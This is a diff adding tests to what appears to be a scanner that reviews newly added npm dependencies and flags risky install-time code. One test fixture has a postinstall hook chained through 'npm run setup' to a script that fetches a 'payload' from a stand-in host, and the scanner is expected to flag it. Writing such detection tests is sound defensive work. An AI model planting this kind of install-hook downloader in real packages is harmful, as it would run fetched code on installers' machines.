@@ -108,6 +108,60 @@ describe("selectAddedDependencies", () => {
     expect(selected).toEqual([]);
   });
 
+  test("a required peer moved to a different runtime spec is reviewed again", () => {
+    const selected = selectAddedDependencies(
+      diffOf(
+        { name: "p", peerDependencies: { react: "^18.0.0" } },
+        {
+          name: "p",
+          dependencies: { react: "^19.0.0" },
+          peerDependencies: { react: "^19.0.0" },
+        },
+      ),
+    );
+    expect(selected).toEqual([
+      { name: "react", section: "dependencies", spec: "^19.0.0", declarationKind: "range" },
+    ]);
+  });
+
+  test("a matching prior runtime spec wins over a different required peer spec", () => {
+    const selected = selectAddedDependencies(
+      diffOf(
+        {
+          name: "p",
+          optionalDependencies: { react: "^19.0.0" },
+          peerDependencies: { react: "^18.0.0" },
+        },
+        {
+          name: "p",
+          dependencies: { react: "^19.0.0" },
+          optionalDependencies: { react: "^19.0.0" },
+          peerDependencies: { react: "^19.0.0" },
+        },
+      ),
+    );
+    expect(selected).toEqual([]);
+  });
+
+  test("an optional peer becoming required is not new code when the runtime spec already exists", () => {
+    const selected = selectAddedDependencies(
+      diffOf(
+        {
+          name: "p",
+          dependencies: { react: "^19.0.0" },
+          peerDependencies: { react: "^19.0.0" },
+          peerDependenciesMeta: { react: { optional: true } },
+        },
+        {
+          name: "p",
+          dependencies: { react: "^19.0.0" },
+          peerDependencies: { react: "^19.0.0" },
+        },
+      ),
+    );
+    expect(selected).toEqual([]);
+  });
+
   test("an optional peer duplicated into dependencies starts installing code", () => {
     const selected = selectAddedDependencies(
       diffOf(
@@ -338,6 +392,26 @@ describe("assessDependencyArtifact", () => {
     };
     const assessment = assessDependencyArtifact(
       [file("package.json", JSON.stringify(manifest))],
+      manifest,
+      { codePatternSet: "javascript", entrypointResolution: "npm" },
+    );
+
+    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.installReachableCapabilities).toContain("code.network-access");
+    expect(assessment.installReachUnproven).toBe(false);
+  });
+
+  test("a lifecycle hook delegated through npm run keeps its downloader reachable", () => {
+    const manifest = {
+      name: "n",
+      version: "1.0.0",
+      scripts: { postinstall: "npm run setup", setup: "node downloader.js" },
+    };
+    const assessment = assessDependencyArtifact(
+      [
+        file("package.json", JSON.stringify(manifest)),
+        file("downloader.js", "fetch('https://cdn.example.invalid/payload');"),
+      ],
       manifest,
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
